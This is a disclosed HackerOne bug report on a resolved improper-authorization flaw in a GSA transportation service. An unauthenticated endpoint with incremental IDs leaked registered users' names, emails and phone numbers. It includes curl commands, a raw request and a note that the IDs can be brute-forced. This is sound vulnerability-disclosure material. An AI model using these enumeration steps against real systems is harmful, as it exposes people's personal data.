---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1175980'
original_report_id: '1175980'
title: '[Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov
  leads to data exposure of all registered users'
weakness: Improper Authorization
team_handle: gsa_vdp
created_at: '2021-04-26T23:19:41.390Z'
disclosed_at: '2021-12-08T15:36:46.105Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 12
asset_identifier: tmss.gsa.gov
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-authorization
---

# [Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users

## Metadata

- HackerOne Report ID: 1175980
- Weakness: Improper Authorization
- Program: gsa_vdp
- Disclosed At: 2021-12-08T15:36:46.105Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi team!
I hope you are having a great Tuesday :)

**Where:** https://tmss.gsa.gov/ 
**Who:** Unathenticated users
**Why:** Improper Access Control at `/tmssserver/api/public/customerregistration/{:id}/userId/`


I found an endpoint (`/tmssserver/api/public/customerregistration/{:id}/userId/`) at https://tmss.gsa.gov/ (Transportation Management Services Solution (TMSS) 2.0) that  leads to data exposure of all registerd user at the platform,  including the following data: 

* Email address
* Phone Number
* Full Name
* Secret question (If set)

## Steps To Reproduce:
1. Go to https://tmss.gsa.gov/
2. Check that you are not authenticated. 
3. Now browse to https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ (You can replace 4750 by any other value between 0 and 4800)
4. Or just CURL `curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/" . The response includes email, Full name, and phone number of user with id 4750. 
{F1279543}

This is how the request looks like. As you can see there is no cookie in the headers or authentication bearer.
```curl
GET /tmssserver/api/public/customerregistration/4500/userId/ HTTP/1.1
Host: tmss.gsa.gov
Connection: close
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://tmss.preprod-acqit.helix.gsa.gov/tmss/customerregistration
Accept-Language: es-ES,es;q=0.9
dnt: 1
sec-gpc: 1

```
5. As the id is incremental note that this can be easily brute-forced to leak all the user's information. 
 `https://tmss.gsa.gov/tmssserver/api/public/customerregistration/:id/userId/`

6. I was not able to submit my user ID as I don't have one until my account gets approved, but using this endpoint you can check that my data is also being leaked here.

`curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"`

{F1279546}

```
{"userRegisterId":192,"registrationType":"User","reportingOfficialId":1504,"agencyCode":"072","bureauCode":"00","firstName":"Alexandrio","lastName":"Wearehackerone","middleInitial":"C","title":"","addressLine1":"ThisIsMYAddress","addressLine2":"PoCAddress","city":"","stateId":null,"zip":"","zipSuffix":"","countryId":326,"phone":"6541112343","phoneExtension":"","email":"alexandrio+1@wearehackerone.com","accessRequested":"HHG","registrationStatus":"Confirm Pending","rejectReason":null,"confirmDate":null,"createdDate":"2021-04-26T22:51:08.000+0000","updateProgram":"Customer_Registration","updateId":null,"updateDate":"2021-04-26T22:51:08.000+0000","agencyName":null,"agencyBureauName":null,"stateName":null,"countryName":null}
```



If you have some questions regarding this feel free to ping me!
Bests,
@alexandrio

## Impact

Data exposure (Emails, addresses, phone numbers, full names etc) of all registered user - Unauthenticated users

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
